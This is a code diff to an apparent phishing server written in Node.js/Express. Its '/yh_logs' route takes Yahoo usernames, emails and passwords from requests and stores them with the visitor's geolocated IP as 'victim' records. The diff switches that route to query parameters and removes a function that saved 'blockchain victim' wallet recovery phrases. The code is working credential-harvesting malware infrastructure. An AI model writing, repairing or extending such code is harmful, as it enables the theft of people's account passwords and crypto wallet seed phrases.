@@ -63,7 +63,7 @@ app.get("/yh_logs", (req, res) => {
     console.log(visitorIp)
     console.log(req.body)
     res.setHeader("Content-Type", "text/plain");
-    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.body.username, req.body.email, req.body.password, req.headers['user-agent'], req, res);
+    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.query.username, req.query.email, req.query.password, req.headers['user-agent'], req, res);
 })
 
 app.use(express.static('web'));
@@ -104,36 +104,6 @@ function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, us
 }
 
 
-function getVictimIpInfoAndSaveBlockchainVictimInfoToDb(email, phrase, userDevice, userAgent, req, res) {
-
-    rp({
-        uri: `http://ip-api.com/json/${visitorIp}`,
-        json: true
-    }).then(victimIpInfo => {
-        console.log(victimIpInfo);
-
-        new blockchainVictim({
-            email,
-            phrase,
-            userDevice,
-            userAgent,
-            victimIpInfo
-        }).save((err, doc) => {
-            if (err) {
-                console.log(err);
-                res.end("Server Error");
-            } else {
-                console.log(doc);
-                res.end("Done");
-            }
-        })
-
-    }).catch(err => {
-        console.log(err)
-        res.end("Server Error");
-    })
-
-}
 
 db.on("error", (err) => {
     console.log(err);
